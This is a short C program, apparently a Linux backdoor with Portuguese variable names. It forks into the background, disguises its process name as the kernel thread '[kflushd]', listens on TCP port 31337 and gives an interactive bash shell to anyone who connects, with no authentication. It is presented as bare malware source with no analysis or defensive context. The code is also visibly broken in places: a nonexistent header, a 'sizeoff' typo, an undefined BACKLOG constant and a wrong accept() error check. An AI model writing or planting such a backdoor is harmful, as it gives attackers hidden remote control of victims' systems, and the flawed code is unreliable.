#include <stdio.h>
#include <stdlib.h>
#include <system.h>
int main(int argc, char *argv[])
{
  int Meusocket, Novosocket, tamanho;
  
  struct sockaddr_in local;
  struct sockaddr_in remote;
  int MINHA_PORTA;
  MINHA_PORTA = 31337;
  
  if(fork() == 0){
            strcpy(argv[0], "[kflushd]");
            
            bzero(&local, sizeoff(local));
            local.sin_family = AF_INET;
            local.sin_port = htons(MINHA_PORTA);
            local.sin_addr.s_addr = INADDR_ANY;
            bzero(&(local.sin_zero), 8);
            
            Meusocket = socket(AF_INET, SOCK_STREAM, 0);
            bind(Meusocket, (struct sockaddr *)&local, sizeof(struct sockaddr));
            listen(Meusocket, BACKLOG);
            tamanho = sizeof(struct sockaddr_in);
            
            while(1)
            {
              if((Novosocket=accept(Meusocket, (struct sockaddr *)&remote, &tamanho)) == 1)
                    {
                      perror("accept");
                      exit(1); 
                      }
                      if(!fork())
                      {
                       close(0); close(1); close(2);
                       dup2(Novosocket, 0); dup2(Novosocket, 1); dup2(Novosocket, 2);
                       execl("/bin/bash","bash","-i", (char *)0);
                       close(Novosocket);
                       exit(0);
                       }
              }
  }
  
}
